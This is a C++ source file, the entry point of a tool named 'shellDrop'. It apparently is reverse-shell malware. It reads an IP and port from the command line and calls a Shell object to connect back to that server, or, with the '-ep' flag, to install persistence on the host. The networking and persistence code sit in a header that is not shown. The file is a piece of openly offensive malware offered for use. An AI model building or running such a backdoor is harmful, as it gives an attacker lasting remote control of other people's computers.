#include "../include/shell.h"

#include <iostream>
#include <string>
#include <cstdlib>

/**
 * @brief This is the main entry point for the shellDrop application.
 * @param argc -> The number of arguments passed to the application.
 * @param argv -> The arguments passed to the application.
 * @return int -> 0 if the application executed successfully, 1 otherwise.
 */
int main(int argc, char** argv)
{
    try
    {
        Shell shell;

        std::string ip = "127.0.0.1";
        int port = 4321;
        bool enablePersistence = false;

        if (argc > 1)
        {
            if (argc == 2 && std::string(argv[1]) == "-ep")
            {
                enablePersistence = true;
            }

            for (int i = 1; i < argc; ++i)
            {
                std::string arg = argv[i];
                if (arg == "-ip" && i + 1 < argc)
                {
                    ip = argv[i + 1];
                    ++i;
                }
                else if (arg == "-p" && i + 1 < argc)
                {
                    port = std::atoi(argv[i + 1]);
                    ++i;
                }
            }
        }

        if (enablePersistence)
        {
            shell.enablePersistence();
        }
        else
        {
            shell.connectToServer(ip, port);
        }
    }
    catch (const std::exception& e)
    {
        std::cerr << e.what() << std::endl;
    }

    return 0;
}
